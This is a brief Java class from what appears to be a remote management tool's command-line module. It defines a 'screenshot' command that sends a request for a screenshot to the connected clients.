package com.wpkg.cli.commands;

import javax.swing.*;
public class Screenshot extends Command{

    public Screenshot(DefaultListModel<String> clientModel)
    {
        super("screenshot", "Get Screenshot", clientModel);
    }
    @Override
    public void execute() {
        sendCommand("screenshot");
    }
}
